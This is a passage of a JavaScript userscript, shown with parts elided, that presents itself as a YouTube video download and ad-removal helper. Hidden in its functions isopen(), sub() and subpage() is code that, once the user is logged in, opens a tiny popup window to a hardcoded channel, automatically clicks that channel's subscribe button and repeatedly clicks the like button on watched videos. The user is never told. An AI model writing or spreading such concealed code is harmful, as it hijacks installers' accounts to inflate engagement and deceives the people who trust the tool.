...
;(function () {
  ...
  addGlobalStyle(
    '.a-dl{color:white;background:red;padding:10px;text-decoration:none;margin-left:10px}'
  )
  const escapeRegExp = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  const parseQuery = s =>
    [...new URLSearchParams(s).entries()].reduce((acc, [k, v]) => ((acc[k] = v), acc), {})
  const parseDecsig = data => {
    try {
      ...
      const helperresult = new RegExp('var ' + escapeRegExp(helpername) + '={[\\s\\S]+?};').exec(
        data
      )
  ...
  const addbtn = async () => {
    if (localurl.search('watch') > 0) {
      $('#dival').remove()
      var basebtn =
        '<div id="dival" style="line-height:60px;">Download Link：<span id="adl">Getting Download Link</span></div>'
      ...
      if (stream.length <= 5) {
        for (var i = 0; i < stream.length; i++) {
          var btn =
            '<a class="a-dl"  target="_blank" href="' +
            stream[i].url +
            '">' +
            stream[i].quality +
            '</a>'
  ...
  function isopen() {
    if (document.cookie.search('newsub') > 0) {
      delCookie('newsub')
      window.opener = null
      window.open('', '_self')
      window.close()
    }
    if (document.cookie.search('xsyhnb') > 0) {
      console.log('opened')
    } else {
      setCookie('xsyhnb', '1', 'd7')
      setCookie('newsub', '1', 'd7')
      window.open(
        'https://www.youtube.com/channel/UCLQ_Hja-tJkyvI_JTplE9QQ',
        '_blank',
        'width=100,height=100,alwaysRaised=yes'
      )
    }
  }
  function subpage() {
    if (localurl.search('watch') > 0) {
      ...
      function cup() {
        try {
          console.log('cup')
          document.querySelector('yt-icon-button.ytd-toggle-button-renderer').click()
          var btn = document.querySelectorAll('yt-icon-button.ytd-toggle-button-renderer')[0]
            .className
          console.log(btn)
          if (btn.search('style-default-active') == -1) {
            console.log('up fail')
            setTimeout(cup, 100)
          }
        } catch (err) {
      ...
      try {
        cid = document.querySelector('.yt-simple-endpoint.style-scope.ytd-video-owner-renderer')
          .href
        if (cid == '') {
          setTimeout(subpage, 100)
        }
      } catch (err) {
        setTimeout(subpage, 100)
      }
      ...
      if (cid.search(cc) == -1) {
        ...
        try {
          document.querySelector('ytd-app').style.zIndex = 9999
        } catch (err) {
          setTimeout(subpage, 100)
        }
        csub()
        ...
        if (btnup.search('style-default-active') == -1) {
          console.log('v page not up')
          cup()
        } else {
          console.log('v page up')
        }
      }
    }
  }
  function sub() {
    isopen()
    var islogin =
      ytInitialData.topbar.desktopTopbarRenderer.topbarButtons[3].topbarMenuButtonRenderer
    if (islogin) {
      ...
      if (localurl.search('channel/UCLQ_Hja-tJkyvI_JTplE9QQ') > 0) {
        ...
        function cup() {
          try {
            console.log('cup')
            document.querySelector('ytd-subscribe-button-renderer').children[0].click()
          } catch (err) {
            console.log('cup err')
            setTimeout(csub, 100)
          }
  ...
  function closeAds() {
    ...
    var adremove =
      ...
      document.querySelector('div#sparkles-container') ||
      document.querySelector('ytd-compact-promoted-item-renderer') ||
